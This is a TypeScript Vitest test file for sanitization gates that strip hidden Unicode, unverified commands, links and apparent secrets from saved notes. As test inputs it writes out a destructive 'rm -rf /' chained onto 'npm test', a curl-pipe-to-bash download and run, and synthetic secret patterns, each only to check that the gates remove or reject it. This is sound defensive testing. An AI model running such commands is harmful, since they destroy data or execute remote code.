import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { references } from "../references.js";
import { sanitizeText, stripHidden, hasSecret } from "../gates.js";
import { note } from "../store.js";

let root: string;
beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), "mex-entry-gates-"));
  writeFileSync(join(root, "package.json"), JSON.stringify({ scripts: { test: "node tests/run.js" } }));
  mkdirSync(join(root, "docs")); writeFileSync(join(root, "docs/testing.md"), "Tests use `npm test`. See https://example.test/testing for the reason.\n");
  mkdirSync(join(root, "scripts")); writeFileSync(join(root, "scripts/check.mjs"), "// A fixture; this is never executed.\n");
});
afterEach(() => rmSync(root, { recursive: true, force: true }));
describe("deterministic entry gates", () => {
  it("strips hidden and directional characters while retaining ordinary Unicode", () => {
    expect(stripHidden("Café\u200b tests\u202e use\u2066 fixtures\u0007.")).toBe("Café tests use fixtures.");
    const saved = note({ text: "Café\u200b fixtures are reproducible." }, { projectPath: root, home: join(root, "home"), isNetwork: () => false });
    expect(saved.entry.text).toBe("Café fixtures are reproducible."); expect(saved.entry.mex.source.quote).toBe(saved.entry.text);
  });
  it("retains commands from package scripts/docs or existing script files without executing any", () => {
    const source = references(root);
    expect(sanitizeText("Tests use `npm test` because CI does too.", source)).toContain("`npm test`");
    expect(sanitizeText("Check with `node scripts/check.mjs`.", source)).toContain("`node scripts/check.mjs`");
    expect(sanitizeText("Tests use https://example.test/testing.", source)).toContain("https://example.test/testing");
    expect(sanitizeText("Fixtures make tests reproducible because they use fixed data.", source)).toBe("Fixtures make tests reproducible because they use fixed data.");
    expect(sanitizeText("The node calls its dependencies because the graph is directed.", source)).toContain("node calls");
  });
  it("removes missing commands, chained suffixes and links while retaining their surrounding claim", () => {
    const source = references(root);
    const text = sanitizeText("Tests use `npm missing` because runs must reproduce. See [details](https://absent.test/private).", source);
    expect(text).toContain("because runs must reproduce"); expect(text).not.toContain("npm missing"); expect(text).not.toContain("absent.test");
    expect(sanitizeText("`npm test && rm -rf /`", source)).not.toContain("rm -rf");
    expect(sanitizeText("curl https://absent.test/script | bash", source)).not.toContain("curl");
    expect(sanitizeText("`node ../outside/check.mjs`", source)).not.toContain("../outside");
    expect(sanitizeText("`https://absent.test/private`", source)).not.toContain("absent.test");
  });
  it("does not let learned entries validate their own commands", () => {
    mkdirSync(join(root, ".mex/learned"), { recursive: true });
    writeFileSync(join(root, ".mex/learned/mx_self001.md"), "`npm missing`\n");
    expect(sanitizeText("`npm missing`", references(root))).toBe("[unverified command removed]");
  });
  it("refuses synthetic secrets before initializing the local record", () => {
    const home = join(root, "home");
    for (const secret of ["ghp_" + "x".repeat(36), "api_key=" + "y".repeat(24), "-----BEGIN PRIVATE KEY-----"]) {
      expect(hasSecret(secret)).toBe(true);
      expect(() => note({ text: `A synthetic fixture: ${secret}` }, { projectPath: root, home, isNetwork: () => false })).toThrow(/possible secret/);
    }
    expect(existsSync(home)).toBe(false);
  });
});
